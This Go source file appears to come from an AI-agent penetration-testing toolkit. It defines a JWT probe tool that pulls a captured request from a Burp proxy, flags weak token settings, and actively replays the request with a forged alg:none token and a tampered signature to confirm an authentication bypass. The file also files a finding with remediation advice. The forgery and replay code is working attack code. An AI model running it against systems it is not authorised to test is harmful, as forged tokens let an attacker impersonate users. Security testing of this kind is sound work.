package agent

import (
	"context"
	"encoding/base64"
	"encoding/json"
	"strings"
	"time"

	"github.com/Autumn-27/artex/internal/devicelab"
	actool "github.com/Autumn-27/norma/tool"
)

// Authentication testing — JWT. Static decode flags structural weaknesses; two
// active replays confirm the dangerous ones deterministically: if the server
// accepts a token re-signed as alg:none, or one whose signature was tampered, it is
// not verifying signatures — a critical authentication bypass. As everywhere, a 2xx
// alone is not the proof; the proof is that a token the server MUST reject is
// accepted while the genuine token was accepted in the same run (baseline).

// bearerToken extracts the JWT from an Authorization: Bearer header (empty if none).
// shortcut: Authorization:Bearer only; extend to Cookie/X-Auth-Token if a target
// carries its JWT elsewhere.
func bearerToken(rawRequest string) string {
	for k, v := range extractAuthHeaders(rawRequest) {
		if strings.EqualFold(k, "authorization") {
			if t := strings.TrimSpace(strings.TrimPrefix(v, "Bearer")); t != v {
				return strings.TrimSpace(t)
			}
		}
	}
	return ""
}

func b64urlDecode(s string) ([]byte, bool) {
	if b, err := base64.RawURLEncoding.DecodeString(s); err == nil {
		return b, true
	}
	if b, err := base64.URLEncoding.DecodeString(s); err == nil {
		return b, true
	}
	return nil, false
}

// decodeJWT splits and base64url-decodes a token's header and payload (no signature
// verification). ok is false when the shape is not header.payload.signature.
func decodeJWT(token string) (header, payload map[string]any, signature string, ok bool) {
	parts := strings.Split(token, ".")
	if len(parts) != 3 {
		return nil, nil, "", false
	}
	hb, ok1 := b64urlDecode(parts[0])
	pb, ok2 := b64urlDecode(parts[1])
	if !ok1 || !ok2 {
		return nil, nil, "", false
	}
	header, payload = map[string]any{}, map[string]any{}
	if json.Unmarshal(hb, &header) != nil || json.Unmarshal(pb, &payload) != nil {
		return nil, nil, "", false
	}
	return header, payload, parts[2], true
}

// jwtStaticIssues reports structural weaknesses observable without the signing key.
func jwtStaticIssues(header, payload map[string]any, now time.Time) []string {
	var issues []string
	alg, _ := header["alg"].(string)
	switch strings.ToLower(alg) {
	case "none", "":
		issues = append(issues, "token header declares alg="+orNone(alg)+" (unsigned token accepted by the client)")
	default:
		if strings.HasPrefix(strings.ToUpper(alg), "HS") {
			issues = append(issues, "symmetric algorithm "+alg+" — if the server also accepts RS*, test HS/RS key confusion")
		}
	}
	exp, hasExp := jwtNumber(payload, "exp")
	switch {
	case !hasExp:
		issues = append(issues, "no exp claim — the token may never expire")
	case int64(exp) < now.Unix():
		issues = append(issues, "token is expired (exp in the past) — check whether the server still accepts it")
	case int64(exp)-now.Unix() > 60*60*24*180:
		issues = append(issues, "very long lifetime (exp > 180 days out) — excessive token validity")
	}
	return issues
}

func jwtNumber(m map[string]any, k string) (float64, bool) {
	switch v := m[k].(type) {
	case float64:
		return v, true
	case json.Number:
		f, err := v.Float64()
		return f, err == nil
	}
	return 0, false
}

func orNone(s string) string {
	if s == "" {
		return "(absent)"
	}
	return s
}

// forgeAlgNone rebuilds the token with header alg=none and an empty signature,
// preserving the payload — the classic unsigned-token forgery.
func forgeAlgNone(token string) (string, bool) {
	_, payload, _, ok := decodeJWT(token)
	if !ok {
		return "", false
	}
	hdr, _ := json.Marshal(map[string]any{"alg": "none", "typ": "JWT"})
	pl, _ := json.Marshal(payload)
	return base64.RawURLEncoding.EncodeToString(hdr) + "." + base64.RawURLEncoding.EncodeToString(pl) + ".", true
}

// tamperSignature flips the last character of the signature so a server that
// verifies signatures must reject it, while the header/payload stay valid.
func tamperSignature(token string) (string, bool) {
	parts := strings.Split(token, ".")
	if len(parts) != 3 || parts[2] == "" {
		return "", false
	}
	sig := []byte(parts[2])
	last := sig[len(sig)-1]
	if last == 'A' {
		sig[len(sig)-1] = 'B'
	} else {
		sig[len(sig)-1] = 'A'
	}
	return parts[0] + "." + parts[1] + "." + string(sig), true
}

func (t *ToolSet) mobileJWTProbe() actool.CoreTool {
	schema := map[string]any{
		"type": "object",
		"properties": map[string]any{
			"mcp_url":       strField("Burp MCP server URL (default http://127.0.0.1:9876)"),
			"history_index": intField("history index of an authenticated request whose Authorization: Bearer header carries the JWT to test"),
		},
		"required":             []any{"history_index"},
		"additionalProperties": false,
	}
	return writeTool("mobile_jwt_probe",
		"Authentication testing for JWTs. Decodes the token from a captured request (static checks: alg:none, missing/expired/over-long exp, HS/RS key-confusion candidate) and runs two ACTIVE replays: the same protected request re-signed as alg:none, and with a tampered signature. If the server accepts either while it accepted the genuine token (baseline), it is not verifying signatures — a confirmed critical authentication bypass. A 2xx is only a finding when a token the server must reject is accepted.",
		schema,
		func(ctx context.Context, in json.RawMessage) (actool.Result, error) {
			var a struct {
				MCPURL       string `json:"mcp_url"`
				HistoryIndex *int   `json:"history_index"`
			}
			if err := json.Unmarshal(in, &a); err != nil {
				return errf("bad arguments: %v", err), nil
			}
			if a.HistoryIndex == nil || *a.HistoryIndex < 0 {
				return actool.Errorf("history_index (>= 0) is required"), nil
			}
			if a.MCPURL == "" {
				a.MCPURL = devicelab.BurpMCPURL()
			}
			c, err := devicelab.DialBurpMCP(ctx, a.MCPURL)
			if err != nil {
				return errf("connect Burp MCP: %v", err), nil
			}
			defer c.Close()
			ex, herr := c.ProxyHistory(ctx, *a.HistoryIndex, 1)
			if herr != nil {
				return errf("read history: %v", herr), nil
			}
			if len(ex) == 0 {
				return errf("no captured exchange at history_index %d", *a.HistoryIndex), nil
			}
			req := ex[0]
			token := bearerToken(req.Request)
			if token == "" {
				return actool.Errorf("no Authorization: Bearer <jwt> in the captured request"), nil
			}
			header, payload, _, ok := decodeJWT(token)
			if !ok {
				return actool.Errorf("Authorization bearer is not a decodable JWT"), nil
			}
			static := jwtStaticIssues(header, payload, time.Now())

			port := 443
			if !req.TLS {
				port = 80
			}
			replayWith := func(tok string) (txnOutcome, int) {
				r := applyIdentityHeaders(req.Request, map[string]string{"Authorization": "Bearer " + tok})
				resp, e := c.SendRequest(ctx, req.Host, port, req.TLS, r)
				if e != nil {
					return txnError, 0
				}
				return classifyTxn(httpStatus(resp), httpBody(resp)), httpStatus(resp)
			}

			baseOutcome, _ := replayWith(token)
			type active struct {
				Test     string     `json:"test"`
				Status   int        `json:"status"`
				Outcome  txnOutcome `json:"outcome"`
				Accepted bool       `json:"accepted_when_it_must_not_be"`
			}
			var actives []active
			var bypasses []string
			if baseOutcome == txnAccepted {
				if forged, ok := forgeAlgNone(token); ok {
					oc, st := replayWith(forged)
					acc := oc == txnAccepted
					actives = append(actives, active{Test: "alg_none", Status: st, Outcome: oc, Accepted: acc})
					if acc {
						bypasses = append(bypasses, "server accepted an alg:none (unsigned) token with the same claims")
					}
				}
				if tampered, ok := tamperSignature(token); ok {
					oc, st := replayWith(tampered)
					acc := oc == txnAccepted
					actives = append(actives, active{Test: "tampered_signature", Status: st, Outcome: oc, Accepted: acc})
					if acc {
						bypasses = append(bypasses, "server accepted a token with an invalid (tampered) signature")
					}
				}
			}

			result := map[string]any{
				"endpoint":         req.Method + " " + req.Host + req.Path,
				"alg":              header["alg"],
				"static_issues":    static,
				"baseline":         baseOutcome,
				"active_tests":     actives,
				"signature_bypass": bypasses,
				"note":             "static_issues are observations; a finding is raised only when an active test shows a must-reject token was accepted.",
			}
			if len(bypasses) > 0 {
				fb := &findingBlock{
					VulnClass:        "Broken Authentication — JWT signature not verified",
					Name:             "JWT signature verification bypass on " + req.Method + " " + req.Path,
					Severity:         "critical",
					Summary:          "The server accepted a forged JWT (alg:none and/or tampered signature), so authentication can be bypassed by minting arbitrary tokens.",
					AffectedEndpoint: req.Host + req.Path,
					Method:           req.Method,
					Preconditions:    "A captured request carrying a valid JWT the server accepts (baseline).",
					Reproduction: append([]string{"Capture an authenticated request to " + req.Method + " " + req.Path + " and confirm the genuine token is accepted."},
						"Replay the request with the token re-signed as alg:none / with a tampered signature; observe the server still accepts it:"),
					Expected:           "The server rejects (401) any token whose signature does not verify, including alg:none.",
					Actual:             strings.Join(bypasses, "; "),
					Impact:             "Full authentication bypass: an attacker can forge a token for any user (set arbitrary sub/role claims) and access protected resources.",
					Remediation:        "Verify the JWT signature server-side against an allow-list of expected algorithms (reject 'none' and algorithm downgrade); pin the expected alg; validate exp/iat/aud/iss.",
					VerificationStatus: "confirmed",
				}
				if id, ok := t.fileFinding(ctx, fb, t.endpointAssetID("https://"+req.Host+req.Path, req.Method)); ok {
					fb.FiledFindingID = id
				}
				result["finding"] = fb
			}
			out, _ := json.Marshal(result)
			return actool.Text(string(out)), nil
		})
}
